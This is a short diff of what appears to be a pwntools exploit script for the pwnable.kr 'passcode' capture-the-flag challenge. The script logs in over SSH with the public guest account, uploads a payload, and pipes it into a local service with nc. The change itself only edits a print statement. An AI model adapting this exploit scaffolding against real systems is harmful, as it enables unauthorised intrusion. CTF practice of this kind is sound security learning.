@@ -18,5 +18,5 @@ attack = "cat /tmp/testing | nc 0 10004\n"
 remote = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
 remote.upload_data(payload, "/tmp/testing")
 proc = remote.run("bash")
-print(f"Attack with this::: {attack}")
+print(f"\nAttack with this::: {attack}")
 proc.interactive()
